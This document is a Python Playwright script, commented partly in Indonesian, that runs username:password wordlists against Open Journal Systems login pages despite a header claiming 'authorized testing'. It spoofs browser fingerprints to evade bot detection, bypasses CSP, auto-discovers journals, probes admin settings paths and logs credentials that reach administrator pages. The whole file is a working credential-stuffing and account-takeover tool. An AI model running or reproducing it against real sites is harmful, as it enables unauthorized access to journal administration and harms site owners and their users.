#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Playwright Login Tester — Ultra Robust (for authorized testing)
---------------------------------------------------------------
• 1 akun = 1 browser context (bersih).
• Wordlist `username:password`.
• Multi-journal: --journals / --journals_file / --auto_discover.
• Multi-target: default "submissions,manager/setup/1,management/settings/website".
• Anti-blank: ensure_nav() retry + hard redirect JS.
• 4xx/5xx → auto-skip (nggak nge-freeze).
• Login fallback: submit_selector → tombol di form[action*='login'] → text=Login → Enter.
• Stealth-ish: user-agent normal + webdriver undefined.
• stop_on_first aman (tanpa nutup tab di tengah loop).
• Log sukses (TERBATAS): hanya saat sampai path penting → success_log.txt.
"""

import argparse, sys, time
from pathlib import Path
from typing import Iterable, Tuple, Optional, List, Set
from urllib.parse import urlparse
from playwright.sync_api import (
    sync_playwright, TimeoutError as PWTimeout, Page, Response
)

NAV_TO  = 35000   # ms
HINT_TO = 8000    # ms

# ---------- CLI ----------
def parse_args():
    p = argparse.ArgumentParser(description="Login tester (ultra robust) + multi-journal + multi-target.")
    p.add_argument("--url", required=True, help="Login page URL (e.g. https://host/index.php/index/login)")
    p.add_argument("--user_field", required=True, help="CSS selector username input")
    p.add_argument("--pass_field", required=True, help="CSS selector password input")
    p.add_argument("--submit_selector", help="(opsional) tombol login (CSS / 'text=Login')")
    p.add_argument("--success_text", help="(opsional) teks muncul setelah login")
    p.add_argument("--success_selector", help="(opsional) selector setelah login, mis: a[href*='signOut']")
    p.add_argument("--wordlist", required=True, help="File 'username:password' per baris")
    # default jadi 0 = unlimited
    p.add_argument("--max_attempts", type=int, default=0,
                   help="Batas jumlah kredensial yang dicek (0 = semua)")
    p.add_argument("--headless", action="store_true")
    p.add_argument("--delay", type=int, default=2)
    p.add_argument("--cooldown", type=float, default=0.6)
    p.add_argument("--success_log", default="success_log.txt")
    # multi-journal
    p.add_argument("--journals", help="Comma-separated contexts (rabbani,okara,...)")
    p.add_argument("--journals_file", help="File daftar journal (satu per baris)")
    p.add_argument("--auto_discover", action="store_true", help="Deteksi journals dari link halaman (best-effort)")
    # multi-target
    p.add_argument("--target_paths",
                   default="submissions,manager/setup/1,management/settings/website",
                   help="Comma-separated paths di bawah /index.php/<journal>/...")
    p.add_argument("--stop_on_first", action="store_true",
                   help="Berhenti setelah 1 target sukses per akun (skip delay, clean exit).")
    return p.parse_args()


# ---------- Utils ----------
def iter_creds(path: str, limit: int) -> Iterable[Tuple[str, str]]:
    """
    Ambil kredensial dari file wordlist.
    limit > 0  → hanya sampai limit baris
    limit <= 0 → semua baris
    """
    unlimited = (limit is None) or (limit <= 0)
    n = 0
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or ":" not in line:
                continue
            if (not unlimited) and (n >= limit):
                break
            u, pw = line.split(":", 1)
            yield u.strip(), pw.strip()
            n += 1

def base_origin(url: str) -> str:
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"

def parse_ctx_from_url(url: str) -> Optional[str]:
    parts = [p for p in urlparse(url).path.split("/") if p]
    if "index.php" in parts:
        i = parts.index("index.php")
        if len(parts) > i+1:
            return parts[i+1]
    return None

def hrefs_on_page(page: Page) -> List[str]:
    try:
        return page.eval_on_selector_all("a[href*='/index.php/']", "els => els.map(a => a.href)") or []
    except Exception:
        return []

def discover_journals(page: Page) -> List[str]:
    seen: Set[str] = set()
    for href in hrefs_on_page(page):
        parts = [p for p in urlparse(href).path.split("/") if p]
        if "index.php" in parts:
            i = parts.index("index.php")
            if len(parts) > i+1:
                ctx = parts[i+1]
                if ctx and ctx != "index":
                    seen.add(ctx)
    return sorted(seen)

def normalize_paths(raw: str) -> List[str]:
    out = []
    for t in (raw or "").split(","):
        t = t.strip().lstrip("/")
        if t: out.append(t)
    return out or ["submissions"]

def success_hint(page: Page, text: Optional[str], sel: Optional[str]):
    try:
        if sel:
            page.wait_for_selector(sel, timeout=HINT_TO); return
    except PWTimeout:
        pass
    if text:
        try: page.wait_for_timeout(400)
        except Exception: pass

def reached_target_or_profile(page: Page, ctx: str, tpath: str) -> bool:
    path = urlparse(page.url).path.rstrip("/")
    if f"/index.php/{ctx}/{tpath}".rstrip("/") in path:
        return True
    if path.endswith("/user/profile") or f"/index.php/{ctx}/user/profile" in path:
        return True
    try:
        if page.query_selector("text=Submissions") or page.query_selector("text=My Queue"):
            return True
    except Exception:
        pass
    return False

def resp_is_error(resp: Optional[Response]) -> bool:
    if resp is None: return False
    try: return resp.status >= 400
    except Exception: return False

# ---------- Anti about:blank nav ----------
def ensure_nav(page: Page, url: str, timeout_ms: int = NAV_TO) -> Optional[Response]:
    """Navigate robustly; retry + hard redirect JS kalau masih about:blank."""
    last_exc = None
    for _ in range(3):
        try:
            resp = page.goto(url, wait_until="domcontentloaded", timeout=timeout_ms)
            if page.url.startswith("about:blank"):
                page.evaluate("u => location.href = u", url)
            try:
                page.wait_for_load_state("domcontentloaded", timeout=8000)
            except PWTimeout:
                pass
            return resp
        except Exception as e:
            last_exc = e
            time.sleep(0.8)
    print(f"[!] ensure_nav failed for {url}: {last_exc}")
    return None

# ---------- Robust login ----------
def perform_login(page: Page, user_sel: str, pass_sel: str, submit_sel: Optional[str],
                  username: str, password: str, cooldown: float) -> bool:
    try:
        page.fill(user_sel, username); time.sleep(cooldown/2)
        page.fill(pass_sel, password); time.sleep(cooldown/2)
    except Exception:
        return False

    if submit_sel:
        try:
            page.click(submit_sel, timeout=2500); return True
        except Exception:
            pass
    try:
        page.click("form[action*='login'] input[type='submit'], "
                   "form[action*='login'] button[type='submit']", timeout=2500)
        return True
    except Exception:
        pass
    for t in ("text=Login", "text=/^Login$/i", "text=/Log in/i"):
        try:
            page.click(t, timeout=1800); return True
        except Exception:
            continue
    try:
        page.focus(pass_sel); page.keyboard.press("Enter"); return True
    except Exception:
        return False

# ---------- MAIN ----------
def main():
    a = parse_args()
    success_log = Path(a.success_log)

    # tampilkan argumen sekali
    print("[*] Args:", vars(a))

    # hitung kredensial valid (baris yg mengandung ':') dgn menghormati --max_attempts
    total_creds = sum(1 for _ in iter_creds(a.wordlist, a.max_attempts))
    print(f"[*] Parsed creds (mengandung ':'): {total_creds}")

    # journals list
    declared: List[str] = []
    if a.journals:
        declared += [x.strip() for x in a.journals.split(",") if x.strip()]
    if a.journals_file:
        with open(a.journals_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                j = line.strip()
                if j:
                    declared.append(j)
    declared = sorted(set(declared))
    targets = normalize_paths(a.target_paths)

    # counters buat summary
    success_count = 0
    redirect_count = 0
    http_err_count = 0
    

    with sync_playwright() as pw:
        # launch (stabil di WSL/VM + sedikit stealth)
        browser = pw.chromium.launch(
            headless=a.headless,
            args=["--disable-gpu", "--no-sandbox", "--disable-blink-features=AutomationControlled"]
        )

        tried = 0  # counter aman buat summary akhir

        for i, (username, password) in enumerate(iter_creds(a.wordlist, a.max_attempts), 1):
            tried = i
            if i % 10 == 0:
                print(f"[*] Progress: {i} creds dicoba")

            print(f"\n[*] Trying {username} ...")

            ctx = browser.new_context(
                ignore_https_errors=True,
                viewport={"width":1366,"height":768},
                user_agent=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                            "AppleWebKit/537.36 (KHTML, like Gecko) "
                            "Chrome/126.0.0.0 Safari/537.36"),
                locale="en-US",
                timezone_id="Asia/Jakarta",
                bypass_csp=True,
            )
            ctx.add_init_script("""
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
window.chrome = { runtime: {} };
Object.defineProperty(navigator, 'languages', { get: () => ['en-US','en'] });
Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
""")
            page = ctx.new_page()

            stop_now = False  # clean break flag

            try:
                # 1) open login
                resp = ensure_nav(page, a.url, timeout_ms=NAV_TO)
                if resp_is_error(resp):
                    print(f"[!] Login URL HTTP {resp.status} → skip creds")
                    http_err_count += 1
                    continue
                try:
                    page.wait_for_load_state("networkidle", timeout=6000)
                except PWTimeout:
                    pass
                time.sleep(a.cooldown)

                # 2) login
                if not perform_login(page, a.user_field, a.pass_field, a.submit_selector,
                                     username, password, a.cooldown):
                    print("[-] Cannot submit login (selector mismatch) → next creds")
                    continue
                try:
                    page.wait_for_load_state("domcontentloaded", timeout=HINT_TO)
                except PWTimeout:
                    pass
                success_hint(page, a.success_text, a.success_selector)

                # 3) journals
                journals = list(declared)
                if not journals and a.auto_discover:
                    journals = discover_journals(page)
                    print(f"[*] Auto-discovered journals: {', '.join(journals) if journals else '(none)'}")
                if not journals:
                    journals = [parse_ctx_from_url(page.url) or "index"]

                origin = base_origin(page.url)
                any_ok = False

                # 4) loop journal → target
                for jctx in journals:
                    if stop_now:
                        break
                    for t in targets:
                        if stop_now:
                            break
                        target_url = f"{origin}/index.php/{jctx}/{t}".rstrip("/")
                        print(f"   → Check {jctx} @ {t}: {target_url}")

                        resp = ensure_nav(page, target_url, timeout_ms=NAV_TO)
                        if resp_is_error(resp):
                            print(f"     [!] HTTP {resp.status} → skip")
                            continue
                        try:
                            page.wait_for_load_state("networkidle", timeout=4000)
                        except PWTimeout:
                            pass

                        if reached_target_or_profile(page, jctx, t):
                            any_ok = True
                            success_count += 1
                            print(f"     [+] success @ {jctx} | {page.url}")

                            if ("/management/settings/website" in page.url) or ("/manager/setup/1" in page.url):
                                success_log.parent.mkdir(parents=True, exist_ok=True)
                                with success_log.open("a", encoding="utf-8") as f:
                                    f.write(f"{username}:{password} -> {page.url}\n")
                                print("     [log] recorded (management/settings/website or manager/setup/1)")

                            if a.stop_on_first:
                                stop_now = True
                            else:
                                time.sleep(max(0, int(a.delay)))
                        else:
                            print(f"     [-] redirected/no access: {page.url}")
                            redirect_count += 1

                if not any_ok:
                    print(f"[~] {username}: login ok tapi ga ada target yg kebuka (submissions/profile/manager/setup/1).")

            finally:
                try:
                    if not page.is_closed():
                        page.close()
                except Exception:
                    pass
                try:
                    ctx.close()
                except Exception:
                    pass
                time.sleep(a.cooldown)

        browser.close()

    # summary setelah semua creds selesai (cuma sekali)
    print(f"[*] Done. Total dicoba: {tried} dari {total_creds} creds valid.")
    print(f"    → Success login: {success_count}")
    print(f"    → Redirect/no access: {redirect_count}")
    print(f"    → HTTP error (4xx/5xx): {http_err_count}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user"); sys.exit(1)

